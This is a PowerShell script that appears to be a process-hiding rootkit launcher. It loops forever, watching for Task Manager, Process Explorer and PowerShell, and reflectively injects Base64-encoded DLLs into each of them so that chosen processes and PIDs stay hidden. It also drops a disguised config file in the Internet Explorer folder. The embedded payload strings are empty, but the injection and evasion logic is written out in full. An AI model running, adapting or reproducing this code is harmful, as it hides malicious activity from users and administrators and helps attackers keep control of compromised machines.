param([string[]] $n=@(),[int[]] $i=@(),[string[]] $x=@())
$x64PayStringBase64=""
$x86PayStringBase64=""
$InvokeStringBase64=""
$ReflectivePEScript=$PSScriptRoot+"\Invoke-ReflectivePEInjectionCopy.ps1"
function writeFiles
{
    param([string[]] $n=@(),[int[]] $i=@())
    $infoTransfetPath="C:\Program Files\Internet Explorer\mdsint.isf"
    $ofs=','
    New-Item -Path $infoTransfetPath -ItemType file -Force >$null
    [string]$i|Out-File -Encoding utf8 -FilePath $infoTransfetPath -Append
    [string]$n|Out-File -Encoding utf8 -FilePath $infoTransfetPath -Append
    New-Item -Path $ReflectivePEScript -ItemType file -Force >$null
    $InvokeBytes=[Convert]::FromBase64String($InvokeStringBase64)
    [io.file]::WriteAllBytes($ReflectivePEScript,$InvokeBytes)
}

function isElevated
{
param()
 $wid=[System.Security.Principal.WindowsIdentity]::GetCurrent()
 $prp=new-object System.Security.Principal.WindowsPrincipal($wid)
 $adm=[System.Security.Principal.WindowsBuiltInRole]::Administrator
 return $prp.IsInRole($adm)
}



function is64bit($a){
try{
Add-Type -MemberDefinition @'
[DllImport("kernel32.dll", SetLastError = true, 
 CallingConvention = CallingConvention.Winapi)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool IsWow64Process(
 [In] System.IntPtr hProcess,
 [Out, MarshalAs(UnmanagedType.Bool)] out bool wow64Process);
'@ -Name NativeMethods -Namespace Kernel32
}catch{}
if(-not [System.Environment]::Is64BitOperatingSystem)
    {return}
$is32Bit=[int]0 
if ([Kernel32.NativeMethods]::IsWow64Process($a.Handle, [ref]$is32Bit)) {$(if ($is32Bit) {$false} else {$true})} else {"IsWow64Process call failed"}
}


function procHiderDaemon
{
    param([string[]] $n=@(),[int[]] $i=@(),[string[]] $x=@())
    $isElev =isElevated
    if(-not $isElev)
    {
        Write-Host 'This script need admin privilages!'
        $choice = read-host "Do you want to continue? (Y/N)"
        while ($choice -notmatch "[y|n]")
            {
            $choice = read-host "Invalid answer. Do you want to continue? (Y/N)"
            }
        if ($choice -eq "n")
        {
            return
        }
     }
    $frobiddenProcessesNames = @("taskmgr","procexp","procexp64","powershell")
    $frobiddenProcessesNames+=$x
    $hiddenPIDs =$i
    $hiddenProcNames=$n
    if($hiddenPIDs.Count+$hiddenProcNames.Count -eq 0)
    {
        Write-Host 'You must use either -i or -n!'
        return
    }
    $hiddenPIDs+=$pID

    writeFiles -i $hiddenPIDs -n $hiddenProcNames
    $x64DDLBytes=[Convert]::FromBase64String($x64PayStringBase64)
    $x86DLLBytes=[Convert]::FromBase64String($x86PayStringBase64)
    $livingFrobiddenProcesses =@()
    $nextLivingFrobProc=@()
    while($true)
    {
        $GetProcRes=Get-Process -Name $frobiddenProcessesNames -ErrorAction Ignore
        foreach($proc in $GetProcRes)
        {
           
                    if($proc.ID -eq $pID)
                    {
                    continue
                    }
                    $nextLivingFrobProc+=$proc.ID
                    if($livingFrobiddenProcesses -notcontains $proc.ID)
                    {
                        #Start-Sleep -m 200
                        if(Get-Process -Id $proc.ID -ErrorAction Ignore)
                            {
                            Write-Host $proc.Name is alive! pID =  $proc.ID
                            . $ReflectivePEScript
                            try
                            {
                            Invoke-ReflectivePEInjection -PEBytes $(if(is64bit($proc)){$x64DDLBytes}else{$x86DDLBytes}) -ProcId $proc.ID
                            }
                            catch{}
                            "$($proc.Name) is x$(if(is64bit($proc)) {'64'} else {'86'})"


                            }
                    
                    } 
         }
      $livingFrobiddenProcesses=$nextLivingFrobProc
      $nextLivingFrobProc=@()
        
    }
}

procHiderDaemon -i $i -n $n -x $x
